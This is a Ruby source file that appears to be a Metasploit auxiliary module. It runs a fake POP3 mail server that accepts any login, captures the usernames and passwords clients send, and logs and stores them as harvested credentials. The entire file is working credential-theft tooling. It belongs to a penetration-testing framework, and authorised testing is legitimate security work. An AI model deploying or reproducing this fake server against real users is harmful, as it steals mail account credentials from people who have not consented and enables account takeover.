##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::TcpServer
	include Msf::Auxiliary::Report


	def initialize
		super(
			'Name'        => 'Authentication Capture: POP3',
			'Description'    => %q{
				This module provides a fake POP3 service that
			is designed to capture authentication credentials.
			},
			'Author'      => ['ddz', 'hdm'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
					[ 'Capture' ]
				],
			'PassiveActions' =>
				[
					'Capture'
				],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 110 ])
			], self.class)
	end

	def setup
		super
		@state = {}
	end

	def run
		@myhost = datastore['SRVHOST']
		@myport = datastore['SRVPORT']
		print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
		exploit()
	end

	def on_client_connect(c)
		@state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
		c.put "+OK\r\n"
	end

	def on_client_data(c)
		data = c.get_once
		return if not data
		cmd,arg = data.strip.split(/\s+/, 2)
		arg ||= ""

		if(cmd.upcase == "USER")
			@state[c][:user] = arg
			c.put "+OK\r\n"
			return
		end

		if(cmd.upcase == "PASS")
			@state[c][:pass] = arg

			report_auth_info(
				:host      => @state[c][:ip],
				:port      => @myport,
				:sname     => 'pop3',
				:user      => @state[c][:user],
				:pass      => @state[c][:pass],
				:source_type => "captured",
				:active    => true
			)
			print_status("POP3 LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
			@state[c][:pass] = data.strip
			c.put "+OK\r\n"
			return
		end

		if(cmd.upcase == "STAT")
			c.put "+OK 0 0\r\n"
			return
		end

		if(cmd.upcase == "CAPA")
			c.put "-ERR No Extended Capabilities\r\n"
			return
		end

		if(cmd.upcase == "LIST")
			c.put "+OK 0 Messages\r\n"
			return
		end

		if(cmd.upcase == "QUIT" || cmd.upcase == "RSET" || cmd.upcase == "DELE")
			c.put "+OK\r\n"
			return
		end

		print_status("POP3 UNKNOWN CMD #{@state[c][:name]} \"#{data.strip}\"")
		c.put "+OK\r\n"
	end

	def on_client_close(c)
		@state.delete(c)
	end


end
